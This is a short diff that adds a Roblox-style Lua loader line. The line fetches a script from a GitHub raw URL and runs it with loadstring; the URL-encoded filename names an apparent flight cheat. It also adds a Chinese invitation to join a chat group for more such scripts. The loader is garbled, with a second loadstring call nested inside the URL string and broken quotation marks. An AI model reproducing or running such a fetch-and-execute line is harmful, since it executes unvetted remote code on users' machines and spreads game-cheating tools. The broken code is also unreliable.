@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%97%A0%E6%95%8C%E5%B0%91%E4%BE%A0%E9%A3%9E%E8%A1%8Cr6.txt"))()"))()
+
+加入群1054706873获取更多
